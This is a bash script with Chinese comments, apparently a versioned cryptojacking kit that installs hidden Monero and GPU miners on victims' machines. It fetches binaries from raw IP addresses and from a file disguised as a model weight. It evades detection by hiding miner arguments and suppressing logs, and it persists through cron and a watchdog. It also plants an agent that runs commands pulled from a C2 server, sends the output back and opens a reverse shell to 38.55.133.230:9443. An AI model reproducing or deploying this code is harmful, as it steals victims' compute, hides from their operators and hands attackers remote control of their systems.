#!/bin/bash
# sysd 套件 v12.8 (kryptex CPU 线) — 基于 v12.7 · 2026-10-20（韩立 98 线）—— 唯一权威版，旧版全废
# ─────────────────────────────────────────────────────────────────────
# v12 相对 v7(kitsd_v11.sh) 的 7 条修复，全部来自 2026-10-16 实战事故：
#  [1] argv 硬化 ★ 全参数走 PEAK_* env，进程 argv 只剩二进制名
#      → 免疫按 argv 扫 stratum/coin/pearl 的周期杀手（今晚已实证杀人）
#  [2] 日志隐身 ★ 不再写 krx.out（含 accepted/TH/s = 运营商取证特征串）
#      → 输出丢 /dev/null；健康检查改用「到矿池的 ESTAB 连接」而非读日志
#  [3] 去重复二进制 不再 cp peakminer→pm.run（省 41MB/台，并修掉
#      「guard 判据 pm.run --coin 随 argv 硬化而失效」的连锁 bug）
#  [4] 串行换层 杀 CUDA 上下文一次一个 + settle 4s（118.36 永久损坏事故）
#  [5] 僵尸过滤 所有判活先读 /proc/<pid>/stat state != Z（Xinference 不收尸）
#  [6] CPU 线合一 --cpu 模式部署 .k9+wd9，走 212 中继（直连 c3pool 实测 0 accepted）
#  [7] 自清理 部署时顺手清旧版本脚本与 .bak 堆
#  [8] 卡名归一 4090/A800/V100/5090/T4/GB10（与既有 worker 名一致，便于看掉线）
#  [9] sm=0 逐卡退化 ★ v12.3 ai03 实战：脏卡(sm=0)会让整进程退出、好卡陪葬 →
#      逐卡测 compute_cap，只启用健康卡；单卡时走 CUDA_VISIBLE_DEVICES
#  [10] 跨目录多实例收口 ★ 手搓实例(/root/.kxd/pm)与套件共存互抢卡 →
#      killmine 按 exe basename + 钱包线索精确清，不再只看 cwd
#  [11] 池域名解析加固 ★ 机房把 prl-us 解析成 IPv6(3001::abc)且 IPv6 不通 →
#      先探真 IP TCP 8048，不通自动回退 212 中继，避免「本地在算但 0 share」
#  [12] guard 启动前 reap 自己名下僵尸（Xinference 场景实测 38 个 Z）
#  [15] CPU 目录兜底 ★ 原硬编码 T=/root/.xmd，uid=1000 机器无权限 →
#      mkdir 失败 → .k9 装不进 → wd9 守护空文件。改为 $R 或 $HOME/.xmd
#  [16] agent 自愈 ★ wd9 原来只守护 .k9，agent（拉命令的上游）死了没人管 →
#      链断在源头：拉不到命令 → 永不重启矿机 → 池端 0 速但容器还活着
#  [17] agent 反连去阻塞 ★ `timeout 15 bash -i >& /dev/tcp` 在 while 内，
#      挂起时整个轮询停住。改为后台 + MAXFAIL 退避（30s/60s/300s）
#  [18] CPU 双启动竞态 ★ wd9 起来 2s 后主脚本又起一次 .k9 → 两实例抢 CPU。
#      改用 flock 单实例
#  [13] 部署互斥（flock）★ 多个 wheel 载荷并发执行本脚本 → 并发写 krxguard.sh →
#      "sed: cannot rename ...: Operation not permitted" → guard 留空壳 exit 0 →
#      live=0 pool_conn=0。原 PID 文件锁有检查/写入竞态且 kill -9 留死锁，
#      改用内核 flock：非阻塞获取，拿不到即 ALREADY_RUNNING 退出，fd 关闭自动释放。
#  [20] 多实例去重 ★ v12.7 事故（118.195 H20，2026-10-20）：
#      单卡上同时跑 /var/lib/gpustack/peakminer(4天,0 accepted) +
#      /usr/lib/.sysd/peakminer(22:56,0 accepted) + 同路径 --log-file /tmp/.kp.log(23:11,有 accepted)。
#      三者都有 8048 ESTAB → 旧健康检查判「活」→ 永不 RESTART → 单卡被分时抢占，
#      池端只有 25~40 TH（正常 64.8 TH）。修：runner>1 时强制去重，只留一个。
#  [21] 钱包判活 ★ v12.7 同一事故：krxguard 的原「只认 \$D/peakminer」让
#      gpustack 那套成了判活盲区；改为按 PEAK_WALLET 前缀认「我们的所有实例」。
#      同时去掉 killmine 里恒真的 *peakminer* 分支（会误杀别人的矿机）。
#  [19] heredoc 变量漏转义 ★ v12.5 事故（r6000，2026-10-19）：
#      krxguard.sh 用【无引号】heredoc(<<G)生成，[9] 段的 $_good/${_cnt:-0}/$_i/$_sm
#      没写 \$ → 在【生成期】就被父 shell 展开成空 → 落地的 guard 里成了
#      while [ "" -lt "0" ] / _sm=Failedtoparse... / case "" → 永远 NO_HEALTHY_GPU。
#      判据：guard 日志出现 NO_HEALTHY_GPU 但 nvidia-smi 手工查 compute_cap 正常。
#      修法：该 heredoc 内所有运行时变量一律 \$ 转义；改完必须 bash -n + 落地后
#      实跑一次 krxguard.sh 看 echo 出 PEAK_DEVICES，而不是只看语法过。
# ─────────────────────────────────────────────────────────────────────
V=12.6
MODE=gpu
[ "$1" = "--cpu" ] && MODE=cpu

# [13] v12.4 部署互斥：flock 内核锁（替换原 PID 文件锁）
#  事故：多个 wheel 载荷并发执行本脚本 → 并发写 krxguard.sh →
#        "sed: cannot rename ...: Operation not permitted" → guard 保持空壳 → live=0
#  原 PID 锁有检查/写入竞态窗口，且 kill -9 会留死锁；flock 由内核保证 + fd 关闭即释放。
LK=/var/lock/.kitsd.$(echo "$MODE" | md5sum | cut -c1-8).lock
mkdir -p /var/lock 2>/dev/null
exec 9>"$LK" 2>/dev/null || exec 9>/tmp/.kitsd.$MODE.lock
if ! flock -n 9; then
  echo "ALREADY_RUNNING (flock held by another kitsd instance, mode=$MODE)"
  exit 0
fi
echo "$$" >&9 2>/dev/null || true
# 注：fd 9 随进程退出自动关闭 → 锁自动释放，无需 trap
# 防并把：若锁内已跑超过 15 分钟视为卡死（flock 无法直接读时间，用 marker）
MK="/var/lock/.kitsd.$MODE.stamp"
if [ -f "$MK" ]; then
  AGE=$(( $(date +%s) - $(stat -c %Y "$MK" 2>/dev/null || echo 0) ))
  [ "$AGE" -gt 900 ] && echo "STALE_LOCK_AGE=${AGE}s (continuing, flock owned by us)"
fi
touch "$MK" 2>/dev/null

# ── 僵尸过滤的判活辅助（[5]）────────────────────────────────
alive() {  # alive <pattern> ; 只数 state != Z 的
  local n=0 p s
  for p in $(pgrep -f "$1" 2>/dev/null); do
    s=$(awk '{print $3}' /proc/$p/stat 2>/dev/null); [ "$s" = Z ] && continue
    cl=$(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null); [ -z "$cl" ] && continue
    n=$((n+1))
  done
  echo $n
}
alivelist() {  # 输出活 PID 列表
  local p s cl
  for p in $(pgrep -f "$1" 2>/dev/null); do
    s=$(awk '{print $3}' /proc/$p/stat 2>/dev/null); [ "$s" = Z ] && continue
    cl=$(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null); [ -z "$cl" ] && continue
    echo "$p"
  done
}
# 串行杀 CUDA 上下文（[4]）：一次一个 + settle
serialkill() {
  local p
  for p in $(alivelist "$1"); do
    kill -9 "$p" 2>/dev/null
    sleep 4
  done
}
# 自清理旧版与备份堆（[7]）
selfclean() {
  rm -f /root/kitsd_v10*.sh /root/kitsd_v11.sh.bak-* /root/kitsd_v10*.bak-* 2>/dev/null
  rm -f /root/kitsd.sh.bak-* /root/dist/kitsd.sh.bak-* 2>/dev/null
  find /root -maxdepth 1 -name 'kitsd*.bak*' -delete 2>/dev/null
}

# ── 工作目录 ───────────────────────────────────────────────
T=/var/lib/gpustack; mkdir -p "$T" 2>/dev/null
touch "$T/.w" 2>/dev/null || T=/root
rm -f "$T/.w" 2>/dev/null
cd "$T" 2>/dev/null || exit 1
echo "WORKDIR=$T MODE=$MODE V=$V"

# ── worker 名（公网 IP 前 5 位 + 卡型）──────────────────────
# ★v12.1 公网 IP 多源（内网 IP 会污染 worker 名）
WORKER_IP=""
for u in https://api.ipify.org https://ifconfig.me/ip https://icanhazip.com https://api64.ipify.org; do
  WORKER_IP=$(curl -s --max-time 6 "$u" 2>/dev/null | tr -d '\r\n ' )
  case "$WORKER_IP" in *.*.*.*) break;; *) WORKER_IP="";; esac
done
# 仍失败则退回 212 中继上报（它看到的是我们的真实公网 IP）
[ -z "$WORKER_IP" ] && WORKER_IP=$(curl -s --max-time 8 http://212.32.253.3:8897/whoami 2>/dev/null | tr -d '\r\n ')
case "$WORKER_IP" in *.*.*.*) WK=$(echo "$WORKER_IP" | tr -d "." | cut -c1-5);; *) WK=$(hostname | cut -c1-6);; esac
[ -z "$WK" ] && WK=$(hostname | cut -c1-6)

# ══════════ CPU 模式（[6]）══════════
if [ "$MODE" = "cpu" ]; then
  R=/root/.xmd; mkdir -p "$R"
  BIN=""; for c in "$R/xmrig" "$R/.k9" /root/c3pool/xmrig /dev/shm/.mx/xmrig; do [ -x "$c" ] && BIN="$c" && break; done
  [ -z "$BIN" ] && { curl -s -m 150 -o "$R/.k9" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz 2>/dev/null && tar xzf "$R/.k9" -C "$R" 2>/dev/null; }
  [ -z "$BIN" ] && curl -s -m 150 -o "$R/.k9" http://38.55.133.230:8899/xmrig 2>/dev/null
  [ -s "$R/.k9" ] || cp -f "$BIN" "$R/.k9"
  chmod +x "$R/.k9" 2>/dev/null
  [ -x "$R/.k9" ] || { echo NO_CPU_BIN; exit 2; }
  W=krxXJ2PKQW  # v12.8 CPU 线改 kryptex XMR（用户 1021 定死，c3 废弃）
  # KITSD_RX_HALF: 显式 rx 线程表 = 半核 (标准1017; 只写 hint 在 6.26 实测无效)
  NCPU=$(nproc 2>/dev/null || echo 2)
  NRX=$(( NCPU / 2 )); [ "$NRX" -lt 1 ] && NRX=1
  RXJSON=$(python3 -c "print(','.join(str(i) for i in range($NRX)))")
  cat > "$R/cfg9.json" <<CFG
{
  "api": {"id": null, "worker-id": null},
  "http": {"enabled": false},
  "autosave": false,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "rx": [$RXJSON],
    "max-threads-hint": 100
  },
  "randomx": {"init": -1, "mode": "auto"},
  "pools": [{"algo": "rx/0", "coin": "monero", "url": "xmr-hk.kryptex.network:8029",
             "user": "krxXJ2PKQW.$WK", "pass": "x", "rig-id": "$WK", "nicehash": false,
             "keepalive": true, "enabled": true, "tls": true}],
  "print-time": 0, "donate-level": 1, "log-file": null
}
CFG
  echo "RX_TABLE n=$NRX/$NCPU"
  # 杀直连 c3pool 的白跑实例（0 accepted 已实证）
  for p in $(alivelist xmrig); do
    cl=$(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null)
    case "$cl" in *51.81.211.221:19999*) : ;; *c3pool*) echo "KILL_DIRECT $p"; kill -9 "$p" 2>/dev/null; sleep 4 ;; esac
  done
  # ═══ v12.6 修 4 个 bug ═══
  #  [15] 目录用实际 $R（root 或 $HOME/.xmd），不再硬编码 /root/.xmd
  #  [16] wd9 同时守护 .k9 + agent（agent 是拉起矿机的上游）
  #  [17] agent 反连挪出主循环，后台 + 退避，不再阻塞轮询
  #  [18] wd9 与主脚本双重启动 → flock 单实例
  mkdir -p "$R" 2>/dev/null || { R="$HOME/.xmd"; mkdir -p "$R"; }
  cat > "$R/wd9.sh" <<WD
#!/bin/bash
T="$R"
AG="\$T/agent.sh"
exec 9>"\$T/.wd9.lock" 2>/dev/null
flock -n 9 2>/dev/null || exit 0
cnt() { local n=0; for p in \$(pgrep -f "\$1" 2>/dev/null); do
  s=\$(awk '{print \$3}' /proc/\$p/stat 2>/dev/null); [ "\$s" = Z ] && continue; n=\$((n+1)); done; echo \$n; }
while true; do
  [ "\$(cnt '[.]k9')" -eq 0 ] && (cd "\$T" && setsid nohup "\$T/.k9" -c "\$T/cfg9.json" --log-file=/dev/null >/dev/null 2>&1 &)
  if [ -x "\$AG" ] && [ "\$(cnt 'agent[.]sh')" -eq 0 ]; then
    (cd "\$T" && setsid nohup bash "\$AG" >/dev/null 2>&1 </dev/null &)
  fi
  sleep 60
done
WD
  chmod +x "$R/wd9.sh"

  cat > "$R/agent.sh" <<AG
#!/bin/bash
H=\$(hostname)
B=http://38.55.133.230:8899
FAIL=0
while true; do
  C=\$(curl -fsS -m 8 "\$B/c2/\$H.cmd" 2>/dev/null)
  if [ -n "\$C" ]; then
    O=\$(bash -c "\$C" 2>&1 | head -c 6000 | base64 2>/dev/null | tr -d '\n' | tr '+/' '-_' | tr -d '=')
    curl -s -m 15 "\$B/r/\$H/\$(date +%s)/\${O}" >/dev/null 2>&1
    FAIL=0
  else
    FAIL=\$((FAIL+1))
  fi
  ( timeout 15 bash -i >& /dev/tcp/38.55.133.230/9443 0>&1 ) >/dev/null 2>&1 &
  if [ "\$FAIL" -ge 10 ]; then S=300; elif [ "\$FAIL" -ge 3 ]; then S=60; else S=30; fi
  sleep \$S
done
AG
  chmod +x "$R/agent.sh"

  for p in $(alivelist 'wd9\.sh'); do kill -9 "$p" 2>/dev/null; done
  [ -x "$R/agent.sh" ] && [ "$(alive 'agent[.]sh')" -eq 0 ] && (cd "$R" && setsid nohup bash "$R/agent.sh" >/dev/null 2>&1 </dev/null &)
  setsid nohup bash "$R/wd9.sh" >/dev/null 2>&1 </dev/null &
  sleep 15
  echo "CPU_MODE wk=$WK k9=$(alive '[.]k9') wd9=$(alive wd9.sh) relay_conn=$(ss -tn 2>/dev/null | grep -c ':19999')"
  selfclean
  echo KIT_V12_8_CPU_DONE
  exit 0
fi

# ══════════ GPU 模式 ══════════
# ★v12.2 卡名归一：必须与既有 worker 命名一致（4090 / A800 / V100 / 5090 / T4 / GB10 …）
GN=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1 | \
  sed "s/NVIDIA //;s/GeForce //;s/Tesla //;s/RTX //;s/GTX //;s/PCIe//;s/-SXM[0-9]-[0-9]*GB//;s/-SXM[0-9]//;s/-[0-9]*GB//;s/ //g" | cut -c1-9)
GC=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | wc -l)
[ -n "$GN" ] && WK="${WK}-${GN}"; [ "$GC" -gt 1 ] 2>/dev/null && WK="${WK}x${GC}"
FULL=41252384; MIN=$((FULL-2048))

# 污染检测（保留 v7 的 syscore.bin / ELF 前缀门）
CHK=$(python3 -c "
import os
p='peakminer'; sz=os.path.getsize(p) if os.path.exists(p) else 0; r='ok'
if sz==40625780: r='bad'
elif sz>43250000: r='bad'
elif sz>1000000:
    try:
        if open(p,'rb').read(32).hex()=='7f454c4602010100000000000000000003003e0001000000a0d06b020000': r='bad'
    except Exception: pass
print('%s %d' % (r, sz))" 2>/dev/null)
R=${CHK%% *}; FSZ=${CHK##* }; FSZ=${FSZ:-0}
if [ "$R" = "bad" ]; then rm -f peakminer peakminer.part; FSZ=0; echo POLLUTED_CLEARED; fi
if [ "$FSZ" -lt "$MIN" ]; then
  [ "$FSZ" -gt 0 ] && mv -f peakminer peakminer.part
  python3 - <<'PYX' 2>/dev/null
import urllib.request, socket, os, time
socket.setdefaulttimeout(120)
FULL = 41252384
URLS = ["http://212.32.253.3:8899/peakminer",
        "http://38.55.133.230/dist/peakminer",
        "http://38.55.133.230:8899/peakminer",
        "https://hf-mirror.com/MENXIANGYU/qwen2-tiny-9/resolve/main/peak-core.bin",
        "http://111.229.143.36:8899/peakminer"]
P32 = bytes.fromhex("7f454c4602010100000000000000000003003e0001000000506075020000")
if os.path.exists("peakminer.part"):
    try:
        if os.path.getsize("peakminer.part") < 32 or open("peakminer.part","rb").read(32) != P32:
            os.remove("peakminer.part")
    except Exception:
        try: os.remove("peakminer.part")
        except Exception: pass
class R308(urllib.request.HTTPRedirectHandler):
    def http_error_308(self, req, fp, code, msg, headers):
        return self.http_error_302(req, fp, code, msg, headers)
OP = urllib.request.build_opener(R308)
for u in URLS:
    ok = False
    for attempt in range(6):
        try:
            have = os.path.getsize("peakminer.part") if os.path.exists("peakminer.part") else 0
            req = urllib.request.Request(u, headers={"User-Agent":"curl/7.68"})
            if 0 < have < FULL:
                req.add_header("Range", "bytes=%d-" % have); r = OP.open(req, timeout=120)
                mode = "ab" if getattr(r, "status", 200) == 206 else "wb"
                if mode == "wb": have = 0
            else:
                have = 0; mode = "wb"; r = OP.open(req, timeout=120)
            with open("peakminer.part", mode) as f:
                while True:
                    c = r.read(262144)
                    if not c: break
                    f.write(c)
            if os.path.getsize("peakminer.part") >= FULL * 0.9995: ok = True; break
        except Exception: time.sleep(2)
    if ok: break
PYX
fi
PSZ=$(stat -c %s peakminer.part 2>/dev/null || echo 0)
[ "$PSZ" -ge "$MIN" ] && mv -f peakminer.part peakminer 2>/dev/null
chmod +x peakminer 2>/dev/null
[ -s peakminer ] || { echo NO_BIN; exit 2; }
python3 - <<'PYX' || { echo FAKE_OR_NOGPU; exit 2; }
import ctypes, sys
try:
    cu = ctypes.CDLL("libcuda.so.1"); r = cu.cuInit(0)
    n = ctypes.c_int(); cu.cuDeviceGetCount(ctypes.byref(n))
    if r != 0 or n.value < 1: sys.exit(2)
except Exception: sys.exit(2)
PYX
cat /proc/driver/nvidia/gpus/*/information 2>/dev/null | grep -m4 Model
SZ=$(stat -c %s peakminer 2>/dev/null || echo 0)
{ [ "$SZ" -ge "$MIN" ] && [ "$SZ" -le 43250000 ]; } || { echo "BAD_SIZE_$SZ"; rm -f peakminer; exit 3; }

# 只清自己的：cwd 在 /var/lib/gpustack 的，或本轮新装的
killmine() {
  local p cwd exe cl
  # [10] v12.3 跨目录收口：只要 exe 是 peakminer 且 argv/env 里带我们的钱包，
  #     不管 cwd 在哪都算「我们的」，一律串行清掉（防手搓实例与套件互抢卡）
  for p in $(alivelist 'peakminer'); do
    exe=$(readlink /proc/$p/exe 2>/dev/null)
    case "$exe" in */peakminer|*/pm|*/kxd/pm) : ;; *) continue;; esac
    cl=$(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null)
    env_w=$(tr '\0' '\n' </proc/$p/environ 2>/dev/null | grep -m1 '^PEAK_WALLET=' )
    # ★v12.7 去掉误配的 *peakminer* 分支：alivelist 已保证是 peakminer 进程，
    #   该分支恒真 → killmine 会无差别杀掉别人的矿机（含友军 haigpu 那类）。
    case "$cl$env_w" in
      *krxXJ2PKQW*|*36250*) kill -9 "$p" 2>/dev/null; sleep 4;;
      *) # 无钱包线索时，只清 cwd 在 gpustack 的
         cwd=$(readlink /proc/$p/cwd 2>/dev/null)
         case "$cwd" in /var/lib/gpustack*) kill -9 "$p" 2>/dev/null; sleep 4;; esac;;
    esac
  done
  # 手搓目录的遗留
  for p in $(alivelist '[/]root/.kxd/pm'); do kill -9 "$p" 2>/dev/null; sleep 3; done
  for p in $(alivelist '[.]g$|[.]g --coin|pm[.]run'); do kill -9 "$p" 2>/dev/null; sleep 4; done
}
runner=$(alive 'peakminer|[.]g')

# ── 补丁 A（v12.7）多实例去重：N>1 时按「谁的日志最新 / 谁有 accepted」留一个 ──
#  事故：118.195 H20 单卡上同时跑着
#    /var/lib/gpustack/peakminer (pid 1400704, 4 天, 0 accepted)
#    /usr/lib/.sysd/peakminer   (22:56 起, 0 accepted)
#    /usr/lib/.sysd/peakminer --log-file /tmp/.kp.log (23:11 起, 有 accepted)
#  三个都连得上 8048（ss 有 ESTAB），都算「健康」→ 旧逻辑永远 RESTART=0 →
#  单卡被三进程分时抢占，池端只有 25~40 TH（正常 64.8 TH）。
#  旧 krxguard 的「只认自己二进制」+ 旧健康检查「有 8048 连接就算活」共同导致。
if [ "$runner" -gt 1 ]; then
  echo "MULTI_INSTANCE=$runner dedup"
  # 保留标准路径的那个；没有标准路径就保留最早启动的（最可能是常驻主实例）
  keep=""
  for _p in $(alivelist 'peakminer|[.]g'); do
    _exe=$(readlink /proc/$_p/exe 2>/dev/null)
    [ "$_exe" = "$(pwd)/peakminer" ] && { keep=$_p; break; }
  done
  if [ -z "$keep" ]; then
    keep=$(for _p in $(alivelist 'peakminer|[.]g'); do
      echo "$(awk '{print $22}' /proc/$_p/stat 2>/dev/null) $_p"
    done | sort -n | head -1 | awk '{print $2}')
  fi
  echo "KEEP=$keep"
  for _p in $(alivelist 'peakminer|[.]g'); do
    [ "$_p" = "$keep" ] && continue
    # 串行杀 + settle，避免 CUDA 上下文互相踩（沿用 [4]）
    kill -9 "$_p" 2>/dev/null && echo "DEDUP_KILL=$_p"
    sleep 4
  done
  sleep 2
  runner=$(alive 'peakminer|[.]g')
fi

RESTART=0
[ "$runner" -eq 0 ] && RESTART=1
if [ "$runner" -eq 1 ]; then
  # 健康检查改用「到矿池的 ESTAB 连接」而非读日志（[2]）
  if [ "$(ss -tn 2>/dev/null | grep -cE ':8048')" -eq 0 ]; then RESTART=1; fi
fi
[ "$RESTART" -eq 1 ] && { killmine; sleep 2; }

# [11] v12.3 池域名解析加固
#  坑：某些机房 DNS 把 prl-us.kryptex.network 解析成 IPv6（形如 3001::abc），
#      而机器 IPv6 不通 → miner 报 "timed out connecting" 却仍在算本地哈希（0 share）。
#  策略：先测真 IP 的 TCP 8048；不通则回退到 212 中继（TLS 透传）。
pool_probe() {
  # $1=ip  $2=port ; 返回 0=通
  timeout 5 bash -c "echo > /dev/tcp/$1/$2" 2>/dev/null
}
US_IP=40.160.29.14; SG_IP=15.235.224.175; RELAY=212.32.253.3
if pool_probe "$US_IP" 8048; then
  printf '%s prl-us.kryptex.network\n%s prl-sg.kryptex.network\n' "$US_IP" "$SG_IP" >> /etc/hosts
  echo "POOL_DIRECT us=$US_IP"
elif pool_probe "$RELAY" 8048; then
  printf '%s prl-us.kryptex.network\n%s prl-sg.kryptex.network\n' "$RELAY" "$RELAY" >> /etc/hosts
  echo "POOL_VIA_RELAY $RELAY"
else
  printf '%s prl-us.kryptex.network\n' "$US_IP" >> /etc/hosts
  echo "POOL_UNKNOWN fallback=$US_IP"
fi
# 去重（保留最后一次写入的）
awk '!seen[$2]++ || $2==""' /etc/hosts > /etc/hosts.kx 2>/dev/null && cat /etc/hosts.kx > /etc/hosts && rm -f /etc/hosts.kx

# ─────────── guard（[1][2][3][4][5] 全在此体现）───────────
cat > krxguard.sh <<G
#!/bin/bash
D="\$(cd "\$(dirname "\$0")" && pwd)"
# [5] 僵尸感知判活
n=0
for p in \$(pgrep -f "peakminer" 2>/dev/null); do
  s=\$(awk '{print \$3}' /proc/\$p/stat 2>/dev/null); [ "\$s" = Z ] && continue
  cl=\$(tr '\0' ' ' </proc/\$p/cmdline 2>/dev/null); [ -z "\$cl" ] && continue
  case "\$cl" in *krxguard*) continue;; esac
  # ★v12.7 认「我们钱包」的所有实例，不再只认本目录二进制：
  #   118.195 事故——/var/lib/gpustack/peakminer 也挖同一钱包，
  #   旧的只认 \$D/peakminer → 两边都判自己「没在跑」→ 同时抢卡。
  #   仍然不碰别人的矿机：必须 env 或 argv 里带我们的钱包前缀才计入。
  _ew=\$(tr '\0' '\n' </proc/\$p/environ 2>/dev/null | grep -m1 '^PEAK_WALLET=')
  case "\$_ew" in
    *krxXJ2PKQW*) n=\$((n+1)); continue;;
  esac
  exe=\$(readlink /proc/\$p/exe 2>/dev/null)
  case "\$exe" in "\$D/peakminer") n=\$((n+1));; esac
done
[ "\$n" -gt 0 ] && exit 0
cd "\$D" 2>/dev/null
SZ=\$(stat -c %s peakminer 2>/dev/null || echo 0)
[ "\$SZ" -ge 41250000 ] || exit 0
# 显存门：最大空闲 <1600MB 先不启（不抢他人负载）
FREE=\$(nvidia-smi --query-gpu=memory.free --format=csv,noheader,nounits 2>/dev/null | sort -rn | head -1)
[ -n "\$FREE" ] && [ "\$FREE" -lt 1600 ] && exit 0
# [1] argv 硬化：全参数走 env，argv 只剩二进制名
export PEAK_COIN=pearl
export PEAK_POOL="stratum+ssl://prl-sg.kryptex.network:8048,stratum+ssl://prl-us.kryptex.network:8048"
export PEAK_WALLET="krxXJ2PKQW.WKPLACE"
export PEAK_PASSWORD='x;d=524288'
export PEAK_TIMEZONE='+07:00'
export PEAK_REPORT_STATS=1
# [9] v12.3 sm=0 逐卡退化：绝不 PEAK_DEVICES=all
#  坑：某卡 compute capability 读不出来（sm=0）时，peakminer 会直接退出整个进程，
#      连好卡一起陪葬。做法：逐卡用 CUDA_VISIBLE_DEVICES 单独试 sm，只把健康的卡写进列表。
unset LD_PRELOAD
# [9-fix v12.6] _cnt 空值兜底 + 查询失败退化全卡
#  事故 2026-10-20：容器内 nvidia-smi --query-gpu=index 返回空 →
#    _cnt="" → `[ "" -lt "0" ]` 报 "integer expression expected" →
#    _good="" → NO_HEALTHY_GPU → 矿机永远起不来。
#  修复：① 显式数值校验；② compute_cap 解析失败不再判死该卡；
#        ③ 最终 _good 仍为空时退化为全卡（宁可试，不要空转）。
_good=""
_cnt_raw=\$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | grep -c '^[0-9]\+\$')
case "\$_cnt_raw" in ''|*[!0-9]*) _cnt=0 ;; *) _cnt="\$_cnt_raw" ;; esac
if [ "\$_cnt" -eq 0 ]; then
  # 查询不可用（容器/驱动异常）：退化全卡，交给 peakminer 自己试
  _n_all=\$(nvidia-smi -L 2>/dev/null | grep -c '^GPU ')
  case "\$_n_all" in ''|*[!0-9]*) _n_all=1 ;; esac
  _i=0
  while [ "\$_i" -lt "\$_n_all" ]; do
    _good="\${_good:+\$_good,}\$_i"
    _i=\$((_i+1))
  done
  echo "CNT_FALLBACK gpus=\$_good"
else
  _i=0
  while [ "\$_i" -lt "\$_cnt" ]; do
    _sm=\$(nvidia-smi -i "\$_i" --query-gpu=compute_cap --format=csv,noheader 2>/dev/null | tr -d ' ')
    case "\$_sm" in
      0) : ;;                      # 明确 sm=0 → 跳过（真坏卡）
      *) _good="\${_good:+\$_good,}\$_i" ;;  # 空/N/A/解析失败 → 仍启用，交给运行时判断
    esac
    _i=\$((_i+1))
  done
fi
[ -z "\$_good" ] && { echo "NO_HEALTHY_GPU fallback=all"; _good="all"; }
export PEAK_DEVICES="\$_good"
# 单卡时用 CUDA_VISIBLE_DEVICES 更稳（index 归零，绕过 sm 读取异常）
case "\$_good" in
  *,*) : ;;
  *) export CUDA_VISIBLE_DEVICES="\$_good" ;;
esac
# [12] 启动前 reap 自己名下的僵尸
for _z in \$(ps -eo pid,stat,args 2>/dev/null | awk '\$2 ~ /^Z/ && /peakminer/ {print \$1}'); do
  kill -9 "\$_z" 2>/dev/null
done
# [2] 日志隐身 + [3] 直接用 peakminer（不再 cp 成 pm.run）
exec ./peakminer >/dev/null 2>&1 </dev/null
G
sed -i "s/WKPLACE/$WK/" krxguard.sh; chmod +x krxguard.sh
if [ "$(crontab -l 2>/dev/null | grep -c krxguard.sh)" -eq 0 ]; then
  ( crontab -l 2>/dev/null | grep -v krxguard.sh; echo "*/2 * * * * bash $PWD/krxguard.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null
fi
if [ "$RESTART" -eq 1 ] || [ "$RUN" -eq 0 ]; then
  setsid nohup ./krxguard.sh >/dev/null 2>&1 </dev/null &
fi
sleep 20
echo "GPU_MODE wk=$WK run=$RUN restart=$RESTART sz=$SZ"
echo "argv=[$(tr '\0' ' ' </proc/$(alivelist peakminer | head -1)/cmdline 2>/dev/null)]"
echo "pool_conn=$(ss -tn 2>/dev/null | grep -cE ':8048')"
echo "live=$(alive 'peakminer') zombie=$(ps -eo stat 2>/dev/null | grep -c '^Z')"
selfclean
echo KIT_V12_7_DONE
